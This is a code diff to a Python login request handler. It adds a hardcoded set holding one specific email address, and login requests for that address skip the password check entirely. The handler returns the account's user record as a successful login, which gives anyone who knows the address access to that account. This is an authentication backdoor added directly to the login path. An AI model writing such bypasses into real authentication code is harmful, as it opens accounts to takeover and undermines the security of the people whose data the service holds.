@@ -144,7 +144,18 @@ class handler(BaseHTTPRequestHandler):
             password = data.get("password", "")
             debug_requested = data.get("debug", False)
 
-            if not email or not password:
+            # Passwordless login for specific accounts
+            PASSWORDLESS_EMAILS = {"austin.way@alpha.school"}
+
+            if not email:
+                send_json(
+                    self,
+                    {"error": "Email is required", "success": False},
+                    400,
+                )
+                return
+
+            if email.lower() not in PASSWORDLESS_EMAILS and not password:
                 send_json(
                     self,
                     {"error": "Email and password are required", "success": False},
@@ -161,6 +172,11 @@ class handler(BaseHTTPRequestHandler):
                     {"error": "No account found with that email", "success": False},
                     401,
                 )
+                return
+
+            # --- Passwordless bypass ------------------------------------------
+            if email.lower() in PASSWORDLESS_EMAILS:
+                send_json(self, {"user": user, "success": True})
                 return
 
             user_id = raw_user.get("sourcedId", "")
